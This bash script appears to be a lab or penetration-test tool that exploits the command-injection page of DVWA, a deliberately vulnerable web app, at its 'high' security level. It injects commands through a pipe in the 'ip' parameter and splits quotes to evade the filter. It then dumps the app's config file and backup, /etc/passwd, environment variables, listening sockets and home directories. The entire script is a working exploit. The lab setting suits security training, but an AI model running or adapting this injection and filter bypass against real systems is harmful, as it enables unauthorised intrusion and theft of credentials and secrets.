#!/bin/bash
# recon.sh — extract DVWA config + host info via authenticated RCE at high level
CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "ip=localhost|$1" --data-urlencode 'Submit=Submit' \
    "$BASE/vulnerabilities/exec/" | tr '\n' ' ' | grep -oE '<pre>[^<]*</pre>' | head -c 2500
  echo; echo " <== $1"
}
mkdir -p evidence/chain

echo "=== whoami"; t 'id' | tee evidence/chain/rce_id.txt
echo "=== uname"; t 'uname -a' | tee evidence/chain/rce_uname.txt
echo "=== webroot pwd"; t 'pwd'
echo "=== parent dir"; t 'ls ../../' | tee evidence/chain/webroot_ls.txt

CFG='cat ../../co'"'"'nfig/config.inc.php'
echo "=== config (quote-split to defeat filter)"; t "$CFG" | tee evidence/chain/dvwa_cfg_dump.txt
BAK='cat ../../co'"'"'nfig/config.inc.php.bak'
echo "=== config.bak"; t "$BAK" | head -c 1200
echo

echo "=== /etc/passwd (first 30 lines)"; t 'cat /etc/passwd' | tee evidence/chain/passwd.txt | head -c 2000
echo
echo "=== listening sockets"; t 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null' | tee evidence/chain/listeners.txt | head -c 1500
echo
echo "=== home dirs"; t 'ls -la /home/ /root/ 2>/dev/null'
echo "=== env"; t 'env' | head -c 800
